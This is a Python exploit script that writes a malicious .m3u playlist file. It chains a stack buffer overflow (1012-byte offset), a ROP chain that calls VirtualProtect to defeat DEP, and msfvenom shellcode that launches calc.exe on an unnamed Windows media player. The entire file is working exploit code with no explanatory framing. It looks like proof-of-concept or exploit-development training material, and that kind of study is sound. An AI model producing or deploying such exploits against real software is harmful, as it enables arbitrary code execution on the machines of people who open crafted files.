#!/usr/bin/python3
from pwn import p32, write

# !py mona pattern_offset eip
offset = 1012
junk = b"A" * offset

"""
BOOL VirtualProtect(
  [in]  LPVOID lpAddress,     (ESP)
  [in]  SIZE_T dwSize,        (0x1)
  [in]  DWORD  flNewProtect,  (0x40)
  [out] PDWORD lpflOldProtect (&Writable)
);
"""

rop  = b""
rop += p32(0x100163c7) # pop ecx; ret,
rop += p32(0x1003f010) # Writable
rop += p32(0x10015f82) # pop eax; ret;
rop += p32(0xffffffc0) # 0x0 - 0x40
rop += p32(0x10014db4) # neg eax; ret;
rop += p32(0x10038a6d) # xchg edx, eax; ret;
rop += p32(0x10015f82) # pop eax; ret;
rop += p32(0xffffffff) # 0x0 - 0x1
rop += p32(0x10014db4) # neg eax; ret;
rop += p32(0x10032f32) # xchg ebx, eax; ret 0;
rop += p32(0x10010157) # pop ebp; ret;
rop += p32(0x10010157) # pop ebp; ret;
rop += p32(0x10010407) # pop esi; ret;
rop += p32(0x100177e4) # jmp dword ptr [eax];
rop += p32(0x10016218) # pop edi; ret;
rop += p32(0x10010158) # ret;
rop += p32(0x10015f82) # pop eax; ret;
rop += p32(0x10040284) # VirtualProtect()
rop += p32(0x1001d7a5) # pushad; ret;
rop += p32(0x100222c5) # jmp esp;

# msfvenom -p windows/exec CMD=calc.exe -f python -v shellcode -b '\x00\x09\x0a\x1a' -e x86/jmp_call_additive
shellcode =  b""
shellcode += b"\xfc\xbb\x8d\x96\x93\x06\xeb\x0c\x5e\x56\x31"
shellcode += b"\x1e\xad\x01\xc3\x85\xc0\x75\xf7\xc3\xe8\xef"
shellcode += b"\xff\xff\xff\x71\x7e\x11\x06\x89\x7f\x76\x8e"
shellcode += b"\x6c\x4e\xb6\xf4\xe5\xe1\x06\x7e\xab\x0d\xec"
shellcode += b"\xd2\x5f\x85\x80\xfa\x50\x2e\x2e\xdd\x5f\xaf"
shellcode += b"\x03\x1d\xfe\x33\x5e\x72\x20\x0d\x91\x87\x21"
shellcode += b"\x4a\xcc\x6a\x73\x03\x9a\xd9\x63\x20\xd6\xe1"
shellcode += b"\x08\x7a\xf6\x61\xed\xcb\xf9\x40\xa0\x40\xa0"
shellcode += b"\x42\x43\x84\xd8\xca\x5b\xc9\xe5\x85\xd0\x39"
shellcode += b"\x91\x17\x30\x70\x5a\xbb\x7d\xbc\xa9\xc5\xba"
shellcode += b"\x7b\x52\xb0\xb2\x7f\xef\xc3\x01\xfd\x2b\x41"
shellcode += b"\x91\xa5\xb8\xf1\x7d\x57\x6c\x67\xf6\x5b\xd9"
shellcode += b"\xe3\x50\x78\xdc\x20\xeb\x84\x55\xc7\x3b\x0d"
shellcode += b"\x2d\xec\x9f\x55\xf5\x8d\x86\x33\x58\xb1\xd8"
shellcode += b"\x9b\x05\x17\x93\x36\x51\x2a\xfe\x5c\xa4\xb8"
shellcode += b"\x85\x13\xa6\xc2\x85\x03\xcf\xf3\x0e\xcc\x88"
shellcode += b"\x0b\xc5\xa8\x67\x46\x47\x98\xef\x0f\x12\x98"
shellcode += b"\x6d\xb0\xc9\xdf\x8b\x33\xfb\x9f\x6f\x2b\x8e"
shellcode += b"\x9a\x34\xeb\x63\xd7\x25\x9e\x83\x44\x45\x8b"
shellcode += b"\xe0\x0b\xd5\x57\xc8\xae\x5d\xfd\x14\x31\x9e"
shellcode += b"\xfd\x14\x31\x9e\xfd"

payload = junk + rop + shellcode

write("file.m3u", payload)
